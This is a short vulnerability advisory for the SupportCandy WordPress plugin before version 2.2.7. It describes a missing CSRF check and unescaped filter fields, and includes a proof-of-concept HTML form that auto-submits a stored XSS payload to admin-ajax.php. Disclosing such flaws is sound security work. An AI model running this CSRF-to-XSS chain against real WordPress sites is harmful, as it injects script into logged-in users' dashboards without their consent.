## WordPress Plugin Vulnerabilities

# SupportCandy < 2.2.7 - CSRF to Cross-Site Scripting

### Description

The plugin does not have CSRF check in the wpsc\_tickets AJAX action, nor has any sanitisation or escaping in some of the filter fields which could allow attackers to make a logged in user having access to the ticket lists dashboard set an arbitrary filter (stored in their cookies) with an XSS payload in it.

### Proof of Concept

<form action="https://example.com/wp-admin/admin-ajax.php" method="POST" id="csrf">
<input type="hidden" name="action" value="wpsc\_tickets">
<input type="hidden" name="setting\_action" value="set\_custom\_filter">
<input type="hidden" name="page\_no" value="1">
<input type="hidden" name="custom\_filter[s]" value="&quot;><script>alert(/XSS/)</script>">
</form><script>csrf.submit()</script>
Go to https://example.com/wp-admin/admin.php?page=wpsc-tickets to trigger the XSS
